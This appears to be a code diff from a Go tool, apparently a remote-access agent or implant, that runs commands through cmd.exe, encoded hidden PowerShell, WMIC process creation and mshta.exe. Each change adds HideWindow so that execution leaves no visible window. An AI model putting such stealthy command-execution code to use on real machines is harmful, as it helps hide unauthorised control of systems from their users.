@@ -46,7 +46,10 @@ func runCommand(method, command string, timeout int) (stdout, stderr string, exi
 // execCMD runs a command via cmd.exe /C with no visible window.
 func execCMD(ctx context.Context, command string) (string, string, int) {
 	cmd := exec.CommandContext(ctx, "cmd.exe", "/C", command)
-	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
+		CreationFlags: createNoWindow,
+	}
 	var out, errBuf bytes.Buffer
 	cmd.Stdout = &out
 	cmd.Stderr = &errBuf
@@ -68,7 +71,10 @@ func execPowerShell(ctx context.Context, command string) (string, string, int) {
 		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
 		"-EncodedCommand", encoded,
 	)
-	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
+		CreationFlags: createNoWindow,
+	}
 	var out, errBuf bytes.Buffer
 	cmd.Stdout = &out
 	cmd.Stderr = &errBuf
@@ -104,7 +110,10 @@ func execWMIC(ctx context.Context, command string) (string, string, int) {
 	wrapped := fmt.Sprintf(`cmd.exe /C %s > "%s" 2>&1`, command, tmp)
 
 	cmd := exec.CommandContext(ctx, "wmic.exe", "process", "call", "create", wrapped)
-	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
+		CreationFlags: createNoWindow,
+	}
 	err := cmd.Run()
 
 	// Poll for output — WMI creates the child process asynchronously
@@ -136,7 +145,10 @@ func execMSHTA(ctx context.Context, command string) (string, string, int) {
 		escapedCmd, escapedTmp,
 	)
 	cmd := exec.CommandContext(ctx, "mshta.exe", script)
-	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
+		CreationFlags: createNoWindow,
+	}
 	err := cmd.Run()
 
 	data, _ := os.ReadFile(tmp)
